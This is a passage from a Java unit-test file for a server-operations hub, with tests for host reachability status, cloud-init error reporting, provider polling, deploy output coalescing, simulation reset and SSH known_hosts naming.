        assertThat(node.status).isEqualTo(HostStatus.UNREACHABLE);
        assertThat(node.lastProblem).contains("locked");
    }

    @Test
    @DisplayName("a server the provider reports off is not 'provisioning': it is unreachable, and the provider's word is the reason")
    void poweredOffIsNotProvisioning() {
        OpsHub hub = hub();
        OpsNode off = hub.applyRecord(provider, new HostRecord("3", "gamma", "203.0.113.3", false, "off", Map.of()));
        assertThat(off.status).isEqualTo(HostStatus.UNREACHABLE);
        assertThat(off.status.inProgress()).as("nothing to sweep for").isFalse();
        assertThat(off.lastProblem).isEqualTo("Scripted reports this server as: off");
        OpsNode fresh = hub.applyRecord(provider, new HostRecord("4", "delta", null, false, "new", Map.of()));
        assertThat(fresh.status).isEqualTo(HostStatus.PROVISIONING);
    }

    @Test
    @DisplayName("cloud-init that ended in error is not announced as done")
    void cloudInitErrorIsNotDone() {
        OpsHub hub = hub();
        OpsNode host = hub.addManualHost(new SshTarget("root", "203.0.113.5", 22, null), "box");
        List<String> lines = new ArrayList<>(probe());
        lines.replaceAll(l -> l.startsWith("cloudinit ") ? "cloudinit running" : l);
        runner.lines = lines;
        ssh.drain(2);
        assertThat(host.status).isEqualTo(HostStatus.CONFIGURING);
        lines = new ArrayList<>(probe());
        lines.replaceAll(l -> l.startsWith("cloudinit ") ? "cloudinit error" : l);
        runner.lines = lines;
        hub.probe(host);
        ssh.drain(2);
        assertThat(host.status).as("ssh answers: it is reachable").isEqualTo(HostStatus.READY);
        assertThat(hub.feed()).extracting(OpsEvent::text)
                .anyMatch(t -> t.contains("cloud-init reports: error"))
                .noneMatch(t -> t.contains("cloud-init done"));
        assertThat(host.lastProblem).contains("cloud-init reports: error");
    }

    @Test
    @DisplayName("only what the host itself answered marks its link: a listing and a silence cross nothing")
    void onlyAnswersCrossTheLink() {
        OpsHub hub = hub();
        provider.listed.add(new HostRecord("1", "alpha", "203.0.113.1", true, "active", Map.of()));
        hub.refresh();
        cloud.drain(2);
        runner.lines = probe(WEB);
        ssh.drain(2);
        runner.lines = List.of();
        hub.probe(hub.topology().node("scripted:1"));
        ssh.drain(2);
        java.util.function.Function<String, OpsEvent> the = part -> hub.feed().stream()
                .filter(e -> e.text().contains(part)).findFirst().orElseThrow(() -> new AssertionError(part));
        assertThat(the.apply("is listed by").overLink()).as("the provider said it, not the host").isFalse();
        assertThat(the.apply("ssh answers on").overLink()).isTrue();
        assertThat(the.apply("is running on").overLink()).as("docker ps came back over the link").isTrue();
        assertThat(the.apply("stopped answering").overLink()).as("a silence crossed nothing").isFalse();
    }

    @Test
    @DisplayName("while polling, the providers are listed again once a minute, not only when Refresh is pressed")
    void pollingRelistsProviders() {
        OpsHub hub = hub();
        hub.startPolling();
        int before = provider.listings;
        for (int tick = 1; tick <= OpsHub.REFRESH_EVERY_TICKS * 2; tick++) {
            ssh.drain(1);
            cloud.drain(1);
            assertThat(provider.listings - before).as("after tick " + tick).isEqualTo(tick / OpsHub.REFRESH_EVERY_TICKS);
        }
        hub.stopPolling();
    }

    @Test
    @DisplayName("a build's flood of output reaches the event thread as a handful of tasks, not one per line")
    void deployOutputIsCoalesced(@TempDir Path project) throws Exception {
        Files.writeString(project.resolve("Dockerfile"), "FROM scratch\nEXPOSE 3000\n");
        Deque<Runnable> edtQueue = new ArrayDeque<>();
        int[] posted = {0};
        Consumer<Runnable> queued = r -> {
            posted[0]++;
            edtQueue.add(r);
        };
        Runnable pump = () -> {
            for (Runnable r = edtQueue.poll(); r != null; r = edtQueue.poll()) {
                r.run();
            }
        };
        DeployRunner chatty = new DeployRunner() {
            @Override
            public Result run(SshTarget target, String remoteCommand, InputStream stdin, Consumer<String> onLine, Duration timeout) {
                if (remoteCommand.startsWith("docker build")) {
                    for (int i = 0; i < 5_000; i++) {
                        onLine.accept("#7 step line " + i);
                    }
                }
                return super.run(target, remoteCommand, stdin, onLine, timeout);
            }
        };
        OpsHub hub = new OpsHub(clock::get, queued, chatty, prefs, cloud, ssh).withProviders(List.of(provider));
        OpsNode host = hub.addManualHost(new SshTarget("root", "203.0.113.5", 22, null), "box");
        ssh.drain(1);
        pump.run();
        DeployRun run = hub.deploy(host, project.toFile(), new org.nmox.studio.infra.ops.remote.DeployPlan("shop", 80, 3000, "1"));
        posted[0] = 0;
        ssh.drain(1); // the whole deploy runs here, with nobody pumping the event thread
        assertThat(posted[0]).as("five thousand lines, a handful of tasks").isLessThan(40);
        pump.run();
        ssh.drain(2);
        pump.run();
        assertThat(run.ok()).isTrue();
        assertThat(run.tail()).hasSize(DeployRun.TAIL).last().asString().contains("http 80 200");
        assertThat(run.tail()).as("the build's last words were kept").anyMatch(l -> l.contains("#7 step line 4999"));
    }

    @Test
    @DisplayName("switching the simulation off takes its runs with it: a new world's first host does not open on the last one's deploy")
    void simulationOffForgetsItsRuns(@TempDir Path project) throws Exception {
        Files.writeString(project.resolve("Dockerfile"), "FROM scratch\nEXPOSE 3000\n");
        OpsHub hub = new OpsHub(clock::get, Runnable::run, runner, prefs, cloud, ssh).withProviders(List.of());
        hub.setSimulation(true);
        OpsProvider sim = hub.provider("simulation");
        ((org.nmox.studio.infra.ops.provider.SimulatedOps) sim).world().unpaced();
        hub.createHost(sim, new HostSpec("demo", "sim1", "s-1vcpu-1gb", "ubuntu-24-04-x64", List.of(), ""));
        cloud.drain(1);
        OpsNode node = hub.topology().nodes(OpsKind.HOST).get(0);
        for (int i = 0; i < 40 && node.status != HostStatus.READY; i++) {
            cloud.drain(1);
            ssh.drain(1);
        }
        assertThat(hub.deploy(node, project.toFile(), new org.nmox.studio.infra.ops.remote.DeployPlan("shop", 80, 3000, "1"))).isNotNull();
        ssh.drain(3);
        assertThat(hub.deployOf(node.id)).isNotNull();
        hub.setSimulation(false);
        assertThat(hub.deployOf(node.id)).isNull();
    }

    @Test
    @DisplayName("ssh files a key under the bare address on port 22 and [address]:port otherwise — brackets never doubled")
    void knownHostsNames() {
        assertThat(OpsHub.knownHostsName("203.0.113.5", 22)).isEqualTo("203.0.113.5");
        assertThat(OpsHub.knownHostsName("203.0.113.5", 2222)).isEqualTo("[203.0.113.5]:2222");
        assertThat(OpsHub.knownHostsName("[::1]", 22)).isEqualTo("::1");
        assertThat(OpsHub.knownHostsName("[::1]", 2222)).isEqualTo("[::1]:2222");
    }

    @Test
    @DisplayName("a probe's own reasons are worded where they are shown; somebody else's words are passed on as said")
    void probeReasonsAreWorded() {
        assertThat(OpsHub.problemText(HostProbe.Reading.trouble(HostProbe.Trouble.NO_ANSWER, 25))).isEqualTo("no answer within 25 s");
        assertThat(OpsHub.problemText(HostProbe.Reading.trouble(HostProbe.Trouble.SILENT_EXIT, 255)))
                .isEqualTo("ssh ended with exit code 255 and said nothing");
        assertThat(OpsHub.problemText(HostProbe.Reading.trouble(HostProbe.Trouble.TOO_MANY_LINES, 2000))).contains("more than 2000 lines");
        assertThat(OpsHub.problemText(HostProbe.Reading.said("Connection refused"))).isEqualTo("Connection refused");
        assertThat(OpsHub.problemText(HostProbe.Reading.of(null))).as("no trouble, no words").isNull();
    }
}
